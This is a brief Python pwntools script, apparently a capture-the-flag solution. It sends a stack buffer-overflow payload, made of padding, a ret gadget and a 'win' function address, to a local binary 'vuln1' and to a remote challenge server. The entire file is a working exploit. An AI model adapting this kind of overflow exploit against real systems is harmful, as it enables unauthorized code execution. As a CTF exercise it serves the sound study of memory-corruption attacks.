from pwn import *
from time import sleep 

win_add = 0x08049276
ret_gadjet = 0x0804900e
payload = b"jb\0" + (0x2c - 3) * b'\0' + p32(ret_gadjet) + p32(win_add)

def local_pwn():
    p = process("./vuln1")
    print(p.recvuntil("input: ").decode())
    sleep(1)
    p.sendline(payload)

    print(p.recvline())
    sleep(0.1)
    print(p.recvline())
def remote_pwn():
    p = remote("45.33.118.86", 9991)
    print(p.recvuntil("input: ").decode())
    sleep(1)
    p.sendline(payload)

    print(p.recvline())
    sleep(0.1)
    print(p.recvline())

    
remote_pwn()